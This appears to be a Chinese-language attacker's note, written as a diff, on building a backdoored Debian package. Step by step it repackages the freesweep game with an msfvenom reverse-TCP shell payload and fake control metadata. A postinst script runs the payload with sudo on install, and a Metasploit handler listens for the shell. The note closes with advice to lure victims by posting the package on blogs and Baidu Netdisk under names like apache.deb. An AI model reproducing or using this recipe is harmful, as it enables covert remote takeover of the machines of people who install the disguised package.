@@ -1,0 +1,105 @@
+制作deb软件包触发后门
+--download-only
+下载不安装
+软件暂存盘
+cd /var/cache/apt/archives
+
+下载软件
+# apt install --download-only freesweep
+# cd /var/cache/apt/archives
+# cp /var/cache/apt/archives/freesweepXXX ~
+# cd ~
+# dpkg -x freesweepXXX free
+
+生成木马
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=10.211.55.6 LPORT=4444 -b "\x00" -i 10 -f elf -o /root/free/usr/games/freesweep_sources
+
+伪装版本信息
+mkdir -p /root/free/DEBIAN
+┌──(root💀kali-linux-2021-3)-[~]
+└─# tee /root/free/DEBIAN/control << 'EOF' 
+Package:freesweep
+Version:1.0.1-1
+Section:Game
+Priority:optional
+Architecture:amd64
+Maintainer:Ubuntu
+Description:atext
+EOF
+
+#写软件版本信息
+
+创建deb软件包，安装后脚本文件，来加载文件
+#写恶意脚本，安装后执行木马
+# tee /root/free/DEBIAN/postinst << 'EOF'
+#!/bin/bash
+sudo chmod 2755 /usr/games/freesweep_sources
+sudo /usr/games/freesweep_sources &
+EOF
+
+chmod 755 /root/free/DEBIAN/postinst
+
+制作软件
+┌──(root💀kali-linux-2021-3)-[~]
+└─# dpkg-deb --build /root/free
+
+
+##开启监听
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfdb run
+同msfconsole
+
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+#攻击载荷
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > run
+
+#######进肉鸡安装free.deb
+dpkg -i free.deb
+
+
+宣传软件包
+博客的附件中放，名字起规范。apache.deb,mysql.deb,万能播放器.deb
+百度网盘
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
